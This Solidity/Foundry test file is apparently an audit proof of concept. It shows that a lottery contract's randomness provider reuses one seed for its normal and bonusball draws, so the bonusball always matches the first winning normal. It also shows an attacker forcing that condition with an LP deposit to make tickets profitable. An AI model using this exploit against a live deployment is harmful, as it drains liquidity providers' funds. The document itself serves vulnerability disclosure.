// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "./PayoutBase.t.sol";

/// ScaledEntropyProvider._getScaledRandomness feeds the SAME seed into the normals draw and the bonusball draw.
/// When bonusballMax == normalBallMax the two Fisher-Yates shuffles are identical, so the winning bonusball is
/// ALWAYS the first winning normal. bonusballMax is derived from the prize pool, so it reaches normalBallMax
/// on its own as the pool grows (here: LP ~= $3.675M with the test-suite params).
contract CorrelatedBonusballTest is PayoutBase {
    function setUp() public {
        // prizePool = lp * 0.8 = 2.94M -> minTickets = 4.2M -> ceil(4.2M / C(30,5)) = 30 = normalBallMax
        deploySystem(3_675_000e6);
    }

    function test_bonusballAlwaysEqualsFirstWinningNormal() public {
        uint256 draws = 25;
        for (uint256 i; i < draws; i++) {
            uint256 id = jackpot.currentDrawingId();
            Jackpot.DrawingState memory ds = jackpot.getDrawingState(id);
            assertEq(ds.bonusballMax, ds.ballMax, "bonusballMax == normalBallMax for this pool size");

            settle(keccak256(abi.encode("pyth", i)));

            (uint8[] memory normals, uint8 bonus) = unpackWinning(id);
            bool inNormals;
            for (uint256 k; k < normals.length; k++) if (normals[k] == bonus) inNormals = true;
            // independent draws would put the bonusball among the 5 normals only 1/6 of the time
            assertTrue(inNormals, "winning bonusball is always one of the winning normals");
        }
    }

    /// Consequence: a ticket whose bonusball is NOT one of its own normals can never win the top tier,
    /// while choosing the bonusball from your own normals raises top-tier odds 6x (1/(5*C) vs 1/(30*C)).
    /// See ev.py: expected payout per $1 ticket rises from ~$0.69 (designed) to ~$1.61, i.e. every such
    /// ticket is +EV and drains LPs.
    function test_rawProviderOutputIdentical() public {
        // Same effect at the provider level for any caller that asks for two sets with equal ranges.
        Requester r = new Requester(scaled);
        vm.deal(address(r), 1 ether);
        for (uint256 i; i < 50; i++) {
            uint64 seq = r.request{value: scaled.getFee(500_000)}(30, 30);
            pyth.triggerCallback(seq, pythProvider, keccak256(abi.encode(i)));
            assertEq(r.lastBonus(), r.lastFirstNormal());
        }
        nextSeq += 50;
    }
}

contract Requester {
    ScaledEntropyProvider s;
    uint256 public lastBonus;
    uint256 public lastFirstNormal;
    constructor(ScaledEntropyProvider _s) { s = _s; }
    function request(uint256 normalMax, uint256 bonusMax) external payable returns (uint64) {
        IScaledEntropyProvider.SetRequest[] memory req = new IScaledEntropyProvider.SetRequest[](2);
        req[0] = IScaledEntropyProvider.SetRequest({samples: 5, minRange: 1, maxRange: normalMax, withReplacement: false});
        req[1] = IScaledEntropyProvider.SetRequest({samples: 1, minRange: 1, maxRange: bonusMax, withReplacement: false});
        return s.requestAndCallbackScaledRandomness{value: msg.value}(500_000, req, this.cb.selector, "");
    }
    function cb(uint64, uint256[][] memory nums, bytes memory) external {
        lastFirstNormal = nums[0][0];
        lastBonus = nums[1][0];
    }
}

/// Reachability: any user can push the next drawing into the bonusballMax == normalBallMax window with a
/// permissionless LP deposit (window for default params: LP value in ($3.616M, $3.741M]).
contract CorrelatedBonusballSteerTest is PayoutBase {
    function test_attackerSteersPoolIntoWindowWithLpDeposit() public {
        deploySystem(2_000_000e6);
        uint256 id = jackpot.currentDrawingId();
        assertLt(jackpot.getDrawingState(id).bonusballMax, NORMAL_MAX);

        address attacker = makeAddr("attacker");
        usdc.transfer(attacker, 1_680_000e6);
        vm.startPrank(attacker);
        usdc.approve(address(jackpot), type(uint256).max);
        jackpot.lpDeposit(1_680_000e6);
        vm.stopPrank();

        settle(keccak256("d1")); // deposit becomes active at settlement
        uint256 next = jackpot.currentDrawingId();
        Jackpot.DrawingState memory ds = jackpot.getDrawingState(next);
        assertEq(ds.bonusballMax, ds.ballMax, "next drawing: bonusballMax == normalBallMax");

        settle(keccak256("d2"));
        (uint8[] memory normals, uint8 bonus) = unpackWinning(next);
        bool inNormals;
        for (uint256 k; k < 5; k++) if (normals[k] == bonus) inNormals = true;
        assertTrue(inNormals);
    }
}
